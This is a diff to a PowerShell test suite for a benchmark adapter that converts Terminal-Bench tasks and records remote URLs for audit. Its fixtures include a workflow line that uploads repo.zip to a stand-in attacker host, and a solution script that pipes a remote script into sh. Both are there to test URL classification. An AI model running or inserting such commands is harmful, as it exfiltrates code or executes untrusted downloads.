@@ -34,6 +34,39 @@ Assert-True (@($remoteScenario.external_benchmark.adapter_metadata.remote_assets
 Assert-True (-not [bool]$remoteScenario.external_benchmark.validator_fidelity.e3_eligible) "remote asset scenario was E3 eligible without proof"
 Assert-True ([bool]$remoteScenario.external_benchmark.adapter_metadata.e3_downgraded_until_remote_assets_proven) "remote asset downgrade metadata was not recorded"
 
+$nestedBinaryTask = Join-Path $runDir "nested-binary-fixture"
+New-Item -ItemType Directory -Path (Join-Path $nestedBinaryTask "data\source_c") -Force | Out-Null
+@'
+instruction: "Read data/source_c/users.parquet and create summary.txt."
+category: data-processing
+'@ | Set-Content -LiteralPath (Join-Path $nestedBinaryTask "task.yaml") -Encoding UTF8
+@'
+FROM scratch
+'@ | Set-Content -LiteralPath (Join-Path $nestedBinaryTask "Dockerfile") -Encoding UTF8
+"echo ok" | Set-Content -LiteralPath (Join-Path $nestedBinaryTask "run-tests.sh") -Encoding UTF8
+[System.IO.File]::WriteAllBytes((Join-Path $nestedBinaryTask "data\source_c\users.parquet"), [byte[]](0x50, 0x41, 0x52, 0x31))
+$nestedBinaryOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $nestedBinaryTask -OutputRoot (Join-Path $runDir "nested-binary-out") -SampleId "nested-binary" -SourceVersion "pinned"
+$nestedBinaryScenarioDir = [string]($nestedBinaryOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
+Assert-True (Test-Path -LiteralPath (Join-Path $nestedBinaryScenarioDir "fixture\data\source_c\users.parquet") -PathType Leaf) "nested binary public fixture file was not copied"
+
+$samePathProjectionTask = Join-Path $runDir "same-path-projection"
+New-Item -ItemType Directory -Path $samePathProjectionTask | Out-Null
+@'
+instruction: "Read data.csv and create summary.txt."
+category: data-processing
+'@ | Set-Content -LiteralPath (Join-Path $samePathProjectionTask "task.yaml") -Encoding UTF8
+@'
+FROM scratch
+COPY data.csv /app/data.csv
+'@ | Set-Content -LiteralPath (Join-Path $samePathProjectionTask "Dockerfile") -Encoding UTF8
+"echo ok" | Set-Content -LiteralPath (Join-Path $samePathProjectionTask "run-tests.sh") -Encoding UTF8
+"a,b`n1,2" | Set-Content -LiteralPath (Join-Path $samePathProjectionTask "data.csv") -Encoding UTF8
+$samePathProjectionOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $samePathProjectionTask -OutputRoot (Join-Path $runDir "same-path-projection-out") -SampleId "same-path-projection" -SourceVersion "pinned"
+$samePathProjectionScenarioDir = [string]($samePathProjectionOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
+$samePathProjectionScenario = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $samePathProjectionScenarioDir "scenario.json") | ConvertFrom-Json
+Assert-True (Test-Path -LiteralPath (Join-Path $samePathProjectionScenarioDir "fixture\data.csv") -PathType Leaf) "same-path Docker COPY projection fixture file missing"
+Assert-True ([bool]$samePathProjectionScenario.external_benchmark.adapter_metadata.agent_app_fixture_projection.projected) "same-path Docker COPY projection was not recorded"
+
 $coveredTask = Join-Path $runDir "covered-uv-and-comment"
 New-Item -ItemType Directory -Path $coveredTask | Out-Null
 @'
@@ -46,14 +79,16 @@ FROM scratch
 '@ | Set-Content -LiteralPath (Join-Path $coveredTask "Dockerfile") -Encoding UTF8
 @'
 #!/bin/sh
-curl -LsSf https://astral.sh/uv/0.7.13/install.sh | sh
+curl -LsSf https://astral.sh/uv/install.sh | sh
 echo ok
 '@ | Set-Content -LiteralPath (Join-Path $coveredTask "run-tests.sh") -Encoding UTF8
+"curl -L https://example.invalid/official-answer-only.sh | sh" | Set-Content -LiteralPath (Join-Path $coveredTask "solution.sh") -Encoding UTF8
 $coveredOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $coveredTask -OutputRoot (Join-Path $runDir "covered-out") -SampleId "covered" -SourceVersion "pinned"
 $coveredScenarioDir = [string]($coveredOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
 $coveredScenario = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $coveredScenarioDir "scenario.json") | ConvertFrom-Json
 $coveredAssets = @($coveredScenario.external_benchmark.adapter_metadata.remote_assets)
-Assert-True ($coveredAssets.Count -eq 1) "uv-covered scenario should record only the uv runtime URL, not comment URLs"
+Assert-True ($coveredAssets.Count -eq 1) "uv-covered scenario should record only the uv runtime URL, not comment URLs or hidden solution URLs"
+Assert-True ([string]$coveredAssets[0].url -eq "https://astral.sh/uv/install.sh") "uv-covered runtime dependency did not keep the source URL for audit"
 Assert-True ([string]$coveredAssets[0].asset_kind -eq "validator_dependency_cache") "uv-covered runtime dependency did not record validator dependency kind"
 Assert-True (-not [bool]$coveredAssets[0].required_for_e3) "uv-covered runtime dependency should not be required as a task remote asset"
 Assert-True ([string]$coveredAssets[0].injection_method -eq "covered_by_terminal_bench_uv_cache") "uv-covered runtime dependency did not record cache coverage"
@@ -65,6 +100,54 @@ Assert-True ([bool]$coveredAssets[0].equivalence_proven) "uv-covered runtime dep
 $coveredFileSize = [int64](Get-Item -LiteralPath ([string]$coveredAssets[0].cache_path)).Length
 Assert-True ([int64]$coveredAssets[0].size_bytes -eq $coveredFileSize) "uv-covered runtime dependency size did not match concrete cache file"
 Assert-True (-not [bool]$coveredScenario.external_benchmark.adapter_metadata.e3_downgraded_until_remote_assets_proven) "uv-covered/comment-only scenario should not be downgraded by remote asset proof"
+$coveredValidatorText = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $coveredScenarioDir "external-validator.ps1")
+Assert-True ($coveredValidatorText -match '\$nativeLoopbackProxy = \$false') "generated validator did not track native loopback proxy"
+Assert-True ($coveredValidatorText -match '\$buildNetworkArgs = if \(\$backend -eq "wsl" -or \$nativeLoopbackProxy\).*"--network", "host"') "native Docker build did not use host network for loopback proxy"
+Assert-True ($coveredValidatorText -match '\$networkArgs = if \(\$backend -eq "wsl" -or \$nativeLoopbackProxy\).*"--network", "host"') "native Docker run did not use host network for loopback proxy"
+
+$localServiceTask = Join-Path $runDir "local-service-url"
+New-Item -ItemType Directory -Path (Join-Path $localServiceTask "tests") -Force | Out-Null
+@'
+instruction: "Create hello.txt."
+category: data-processing
+'@ | Set-Content -LiteralPath (Join-Path $localServiceTask "task.yaml") -Encoding UTF8
+"FROM scratch" | Set-Content -LiteralPath (Join-Path $localServiceTask "Dockerfile") -Encoding UTF8
+"echo ok" | Set-Content -LiteralPath (Join-Path $localServiceTask "run-tests.sh") -Encoding UTF8
+@'
+def test_local_service():
+    assert "curl -sk https://localhost:8443/index.html)" is not None
+'@ | Set-Content -LiteralPath (Join-Path $localServiceTask "tests\test_outputs.py") -Encoding UTF8
+$localServiceOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $localServiceTask -OutputRoot (Join-Path $runDir "local-service-out") -SampleId "local-service" -SourceVersion "pinned"
+$localServiceScenarioDir = [string]($localServiceOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
+$localServiceScenario = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $localServiceScenarioDir "scenario.json") | ConvertFrom-Json
+$localServiceAssets = @($localServiceScenario.external_benchmark.adapter_metadata.remote_assets)
+Assert-True ($localServiceAssets.Count -eq 1) "local service URL was not recorded for audit"
+Assert-True ([string]$localServiceAssets[0].url -eq "https://localhost:8443/index.html") "local service URL retained trailing punctuation"
+Assert-True ([string]$localServiceAssets[0].asset_kind -eq "local_service_endpoint") "localhost validator URL was not classified as local service endpoint"
+Assert-True (-not [bool]$localServiceAssets[0].required_for_e3) "localhost validator URL should not require external asset proof"
+Assert-True (-not [bool]$localServiceScenario.external_benchmark.adapter_metadata.e3_downgraded_until_remote_assets_proven) "localhost validator URL should not downgrade E3"
+
+$heredocFixtureTask = Join-Path $runDir "heredoc-fixture-url"
+New-Item -ItemType Directory -Path $heredocFixtureTask | Out-Null
+@'
+instruction: "Remove the suspicious workflow upload."
+category: software-engineering
+'@ | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "task.yaml") -Encoding UTF8
+"FROM scratch" | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "Dockerfile") -Encoding UTF8
+@'
+cat > deploy.yml << 'EOF'
+run: curl -X POST -F "file=@repo.zip" https://hackerX.com/upload
+EOF
+'@ | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "setup.sh") -Encoding UTF8
+"echo ok" | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "run-tests.sh") -Encoding UTF8
+$heredocFixtureOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $heredocFixtureTask -OutputRoot (Join-Path $runDir "heredoc-fixture-out") -SampleId "heredoc-fixture" -SourceVersion "pinned"
+$heredocFixtureScenarioDir = [string]($heredocFixtureOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
+$heredocFixtureScenario = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $heredocFixtureScenarioDir "scenario.json") | ConvertFrom-Json
+$heredocFixtureAssets = @($heredocFixtureScenario.external_benchmark.adapter_metadata.remote_assets)
+Assert-True ($heredocFixtureAssets.Count -eq 1) "heredoc fixture URL was not recorded for audit"
+Assert-True ([string]$heredocFixtureAssets[0].asset_kind -eq "fixture_literal_endpoint") "heredoc fixture URL was misclassified as runtime network"
+Assert-True (-not [bool]$heredocFixtureAssets[0].required_for_e3) "heredoc fixture URL should not require external asset proof"
+Assert-True (-not [bool]$heredocFixtureScenario.external_benchmark.adapter_metadata.e3_downgraded_until_remote_assets_proven) "heredoc fixture URL should not downgrade E3"
 
 $dockerUvTask = Join-Path $runDir "docker-uv"
 New-Item -ItemType Directory -Path $dockerUvTask | Out-Null
@@ -222,6 +305,9 @@ Assert-True ([string]$cacheScenario.external_benchmark.adapter_metadata.docker_i
 $cacheValidator = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $cacheScenarioDir "external-validator.ps1")
 Assert-True ($cacheValidator -match [regex]::Escape('$cacheEnabled = ([string]$env:TASKSPACE_DOCKER_IMAGE_CACHE -eq "1" -and $cacheEligible)')) "generated validator did not gate docker cache behind env opt-in and eligibility"
 Assert-True ($cacheValidator -match [regex]::Escape('$cacheEligible = $false')) "generated validator did not disable cache for floating Dockerfile base image"
+Assert-True ($cacheValidator -match [regex]::Escape('$proxyBuildArgs += @("--build-arg", "$proxyName=$proxyValue")')) "generated validator did not forward proxy variables to Docker build"
+Assert-True ($cacheValidator -match [regex]::Escape('proxy_env_preserved_loopback=$proxyName')) "generated validator did not preserve WSL loopback proxy under host networking"
+Assert-True ($cacheValidator -notmatch [regex]::Escape('proxy_env_skipped_loopback=$proxyName')) "generated validator still skips WSL loopback proxy"
 "FROM alpine@sha256:0000000000000000000000000000000000000000000000000000000000000000" | Set-Content -LiteralPath (Join-Path $cacheTask "Dockerfile") -Encoding UTF8
 $cachePinnedOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $cacheTask -OutputRoot (Join-Path $runDir "docker-cache-pinned-out") -SampleId "docker-cache" -SourceVersion "pinned"
 $cachePinnedScenarioDir = [string]($cachePinnedOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
@@ -235,7 +321,7 @@ Assert-True (-not [string]::IsNullOrWhiteSpace([string]$pinnedCache.uv_install_s
 Assert-True ([string]$pinnedCache.docker_platform -eq "default" -and [string]$pinnedCache.docker_network_mode -eq "default" -and [string]$pinnedCache.docker_build_environment_mode -eq "host-proxy-forwarded") "docker cache metadata did not include platform/network/env proof fields"
 $cachePinnedValidator = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $cachePinnedScenarioDir "external-validator.ps1")
 Assert-True ($cacheValidator -match [regex]::Escape('Invoke-DockerOutput -Arguments @("image", "inspect", $cacheImage)')) "generated validator did not inspect cache image before build"
-Assert-True ($cachePinnedValidator -match [regex]::Escape('Invoke-Docker -Arguments @("build", "--pull", "-t", $cacheImage, $fixtureDockerPath)')) "generated validator did not build stable cache image on miss"
+Assert-True ($cachePinnedValidator -match [regex]::Escape('Invoke-Docker -Arguments (@("build") + $buildNetworkArgs + $proxyBuildArgs + @("--pull", "-t", $cacheImage, $fixtureDockerPath))')) "generated validator did not build stable cache image on miss with build network/proxy args"
 Assert-True ($cachePinnedValidator -match [regex]::Escape('"cache_hit"')) "generated validator did not record cache hit classification"
 Assert-True ($cachePinnedValidator -match [regex]::Escape('Invoke-WithDockerCacheLock')) "generated validator did not wrap Docker cache inspect/build with cache lock"
 Assert-True ($cachePinnedValidator -match [regex]::Escape('cache_lock_wait_ms = [int64]$script:TaskspaceDockerCacheLockWaitMs')) "generated validator did not record Docker cache lock wait"
